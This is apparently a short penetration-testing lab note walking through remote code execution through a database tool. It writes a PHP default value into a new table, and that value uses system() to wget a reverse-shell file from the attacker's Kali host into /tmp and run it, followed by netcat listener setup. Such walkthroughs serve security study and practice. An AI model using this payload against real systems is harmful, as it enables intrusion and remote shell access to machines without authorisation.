
Video Walkthrough
https://www.youtube.com/watch?v=mHsMCfg_KQw

#### reverse shell

```bash - kali
cp /usr/share/webshells/php/php-reverse-shell.php ./Shelly.txt
```

edit file to host and ip.

Create a new Database poc.php

![[Pasted image 20221108115012.png]]

![[Pasted image 20221108115033.png]]

Create a new table:

![[Pasted image 20220616154316.png]]

Paste the following php code in the "Default Value" textbox.
```bash - kali
<?php system("wget $KALI:80/Shelly.txt -O /tmp/Shelly.php; php /tmp/Shelly.php"); ?>
```

![[Pasted image 20221108115110.png]]

Below, we can see our table was created in `/usr/local/databases/poc.php`

![[Pasted image 20221115132603.png]]

Now we set up our python server.

![[Python#Server]]

set up your netcat listener

![[rlwrap]]



